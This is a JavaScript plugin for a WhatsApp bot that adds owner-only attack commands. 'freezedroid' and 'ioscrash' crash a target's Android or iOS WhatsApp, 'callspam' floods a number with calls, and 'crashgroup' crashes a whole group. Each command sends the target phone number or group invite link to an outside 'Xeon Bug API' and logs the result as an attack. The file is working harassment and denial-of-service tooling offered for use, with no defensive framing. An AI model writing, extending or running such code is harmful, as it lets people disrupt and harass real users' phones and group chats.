// plugins/xeon.js
const { cmd } = require('../arslan');
const xeon = require('../lib/xeon');
const guard = require('../lib/rizofreeze_guard');  // reuse guard

// ═══════════════════════════════════════════
//  HELPER — extract target from args
// ═══════════════════════════════════════════
function parseTarget(args, allowGroup = false) {
    if (!args[0]) return { ok: false, reason: 'no_arg' };

    // group link check
    if (allowGroup) {
        const m = String(args[0]).match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
        if (m) return { ok: true, type: 'group', value: args[0], code: m[1] };
    }

    // number check
    const num = String(args[0]).replace(/[^0-9]/g, '');
    if (num && num.length >= 10) {
        return { ok: true, type: 'number', value: num };
    }

    return { ok: false, reason: 'invalid' };
}

// ═══════════════════════════════════════════
//  .freezeDroid — Android WhatsApp crash
// ═══════════════════════════════════════════
cmd({
    pattern: 'freezedroid',
    alias: ['fd', 'androcrash', 'xeonfd'],
    desc: 'Xeon API — Android WhatsApp delay/crash (owner only)',
    category: 'owner',
    react: '🤖',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, args, isCreator, reply }) => {
    try {
        if (!isCreator) return reply('🔒 *Owner Only*');

        const t = parseTarget(args);
        if (!t.ok) {
            return reply(
`📌 *Usage:* .freezedroid 923xxxxxxxxx

📖 *Example:* .freezedroid 923001234567

🤖 Xeon Bug API — Android crash
⏳ Result: delay / freeze / crash`
            );
        }

        const check = guard.checkTarget(t.value, botNumFrom(conn));
        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${t.value}\`\n📋 ${check.reason}`);

        await reply(
`🤖 *FREEZEDROID LAUNCHED*
🎯 Number: \`${t.value}\`
📡 Endpoint: \`/freezeDroid\`
⚡ Contacting Xeon API...`
        );

        const res = await xeon.freezeDroid(t.value);

        if (res.ok) {
            guard.recordAttack(t.value, 'success');
            await conn.sendMessage(from, { react: { text: '🤖', key: mek.key } });
            return reply(
`✅ *FREEZEDROID SENT*
🎯 Number: \`${t.value}\`
📡 Status: \`${res.status}\`
📦 Response: \`${JSON.stringify(res.data).slice(0, 200)}\`
🕒 ${new Date().toLocaleString()}`
            );
        } else {
            guard.recordAttack(t.value, 'failed:' + res.error);
            return reply(`⚠️ *Xeon API Error*\n\nStatus: \`${res.status}\`\n${res.error}`);
        }

    } catch (err) {
        console.log('FREEZEDROID ERROR:', err);
        return reply(`❌ *Error*\n\n${err.message}`);
    }
});

// ═══════════════════════════════════════════
//  .callspam — Call flood
// ═══════════════════════════════════════════
cmd({
    pattern: 'callspam',
    alias: ['cs', 'callbomb', 'xeoncs'],
    desc: 'Xeon API — spam call a number (owner only)',
    category: 'owner',
    react: '📞',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, args, isCreator, reply }) => {
    try {
        if (!isCreator) return reply('🔒 *Owner Only*');

        const t = parseTarget(args);
        if (!t.ok) {
            return reply(
`📌 *Usage:* .callspam 923xxxxxxxxx

📖 *Example:* .callspam 923001234567

📞 Xeon Bug API — call flood
⚠️ Target ke phone pe calls aate rahenge`
            );
        }

        const check = guard.checkTarget(t.value, botNumFrom(conn));
        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${t.value}\`\n📋 ${check.reason}`);

        await reply(
`📞 *CALLSPAM LAUNCHED*
🎯 Number: \`${t.value}\`
📡 Endpoint: \`/callSpam\`
⚡ Contacting Xeon API...`
        );

        const res = await xeon.callSpam(t.value);

        if (res.ok) {
            guard.recordAttack(t.value, 'success');
            await conn.sendMessage(from, { react: { text: '📞', key: mek.key } });
            return reply(
`✅ *CALLSPAM SENT*
🎯 Number: \`${t.value}\`
📡 Status: \`${res.status}\`
📦 Response: \`${JSON.stringify(res.data).slice(0, 200)}\`
🕒 ${new Date().toLocaleString()}`
            );
        } else {
            guard.recordAttack(t.value, 'failed:' + res.error);
            return reply(`⚠️ *Xeon API Error*\n\nStatus: \`${res.status}\`\n${res.error}`);
        }

    } catch (err) {
        console.log('CALLSPAM ERROR:', err);
        return reply(`❌ *Error*\n\n${err.message}`);
    }
});

// ═══════════════════════════════════════════
//  .ioscrash — iOS WhatsApp crash
// ═══════════════════════════════════════════
cmd({
    pattern: 'ioscrash',
    alias: ['iosc', 'icrash', 'xeonios'],
    desc: 'Xeon API — crash iOS WhatsApp (owner only)',
    category: 'owner',
    react: '🍎',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, args, isCreator, reply }) => {
    try {
        if (!isCreator) return reply('🔒 *Owner Only*');

        const t = parseTarget(args);
        if (!t.ok) {
            return reply(
`📌 *Usage:* .ioscrash 923xxxxxxxxx

📖 *Example:* .ioscrash 923001234567

🍎 Xeon Bug API — iOS crash
⚠️ iOS device target only`
            );
        }

        const check = guard.checkTarget(t.value, botNumFrom(conn));
        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${t.value}\`\n📋 ${check.reason}`);

        await reply(
`🍎 *IOSCRASH LAUNCHED*
🎯 Number: \`${t.value}\`
📡 Endpoint: \`/iosCrash\`
⚡ Contacting Xeon API...`
        );

        const res = await xeon.iosCrash(t.value);

        if (res.ok) {
            guard.recordAttack(t.value, 'success');
            await conn.sendMessage(from, { react: { text: '🍎', key: mek.key } });
            return reply(
`✅ *IOSCRASH SENT*
🎯 Number: \`${t.value}\`
📡 Status: \`${res.status}\`
📦 Response: \`${JSON.stringify(res.data).slice(0, 200)}\`
🕒 ${new Date().toLocaleString()}`
            );
        } else {
            guard.recordAttack(t.value, 'failed:' + res.error);
            return reply(`⚠️ *Xeon API Error*\n\nStatus: \`${res.status}\`\n${res.error}`);
        }

    } catch (err) {
        console.log('IOSCRASH ERROR:', err);
        return reply(`❌ *Error*\n\n${err.message}`);
    }
});

// ═══════════════════════════════════════════
//  .crashgroup — group crash
// ═══════════════════════════════════════════
cmd({
    pattern: 'crashgroup',
    alias: ['cg', 'grpcrash', 'xeongroup'],
    desc: 'Xeon API — crash entire group (owner only)',
    category: 'owner',
    react: '💣',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, args, isCreator, reply }) => {
    try {
        if (!isCreator) return reply('🔒 *Owner Only*');

        const t = parseTarget(args, true);
        if (!t.ok || t.type !== 'group') {
            return reply(
`📌 *Usage:* .crashgroup <grouplink>

📖 *Example:*
.crashgroup https://chat.whatsapp.com/ABC123

💣 Xeon Bug API — group crash
⚠️ All members affected`
            );
        }

        // resolve group JID for guard
        let jid = t.code;
        try {
            const md = await conn.groupGetInviteInfo(t.code);
            jid = md.id;
        } catch (_) {}

        const check = guard.checkTarget(jid, botNumFrom(conn));
        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${t.code}\`\n📋 ${check.reason}`);

        await reply(
`💣 *CRASHGROUP LAUNCHED*
🔗 Group: \`${t.code}\`
📡 Endpoint: \`/crashGroup\`
⚡ Contacting Xeon API...`
        );

        const res = await xeon.crashGroup(t.value);

        if (res.ok) {
            guard.recordAttack(jid, 'success');
            await conn.sendMessage(from, { react: { text: '💣', key: mek.key } });
            return reply(
`✅ *CRASHGROUP SENT*
🔗 Group: \`${t.code}\`
📡 Status: \`${res.status}\`
📦 Response: \`${JSON.stringify(res.data).slice(0, 200)}\`
🕒 ${new Date().toLocaleString()}`
            );
        } else {
            guard.recordAttack(jid, 'failed:' + res.error);
            return reply(`⚠️ *Xeon API Error*\n\nStatus: \`${res.status}\`\n${res.error}`);
        }

    } catch (err) {
        console.log('CRASHGROUP ERROR:', err);
        return reply(`❌ *Error*\n\n${err.message}`);
    }
});

// ═══════════════════════════════════════════
//  .xeon — API health + info
// ═══════════════════════════════════════════
cmd({
    pattern: 'xeon',
    alias: ['xeoninfo', 'xeonapi'],
    desc: 'Xeon Bug API health + info',
    category: 'owner',
    react: '📡',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { reply, isCreator }) => {
    if (!isCreator) return reply('🔒 Owner only.');

    const health = await xeon.checkApiHealth();

    return reply(
`📡 *XEON BUG API*

🔗 Base: \`${xeon.CONFIG.BASE_URL}\`
💚 Status: ${health.ok ? '✅ ONLINE' : '⚠️ OFFLINE (' + health.error + ')'}

*Endpoints:*
• \`.freezedroid 923xxx\` — Android crash
• \`.callspam 923xxx\` — call flood
• \`.ioscrash 923xxx\` — iOS crash
• \`.crashgroup <link>\` — group crash

👨‍💻 By: Dream Guy RIZO`
    );
});

// ═══════════════════════════════════════════
//  HELPER — bot number
// ═══════════════════════════════════════════
function botNumFrom(conn) {
    return String(conn.user?.id || '')
        .split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
}